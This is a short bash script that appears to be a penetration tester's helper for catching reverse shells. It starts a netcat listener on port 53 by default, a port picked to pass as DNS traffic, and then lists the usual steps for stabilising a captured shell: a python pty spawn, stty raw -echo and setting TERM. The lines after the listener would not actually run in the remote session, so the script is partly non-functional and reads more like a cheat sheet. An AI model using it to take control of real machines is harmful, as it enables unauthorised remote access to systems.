#!/bin/bash
## Fabio Felgueiras
## 2023

# Set the default listening port
DEFAULT_PORT=53

# Use the port provided as an argument or the default if not provided
LISTEN_PORT="${1:-$DEFAULT_PORT}"

# Start listening for incoming connections
nc -lvp $LISTEN_PORT

# Upon connection, apply stabilization steps
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Send Ctrl+Z
echo "^Z"

# Stabilize the shell
stty raw -echo
fg

# Set the terminal type
export TERM=xterm
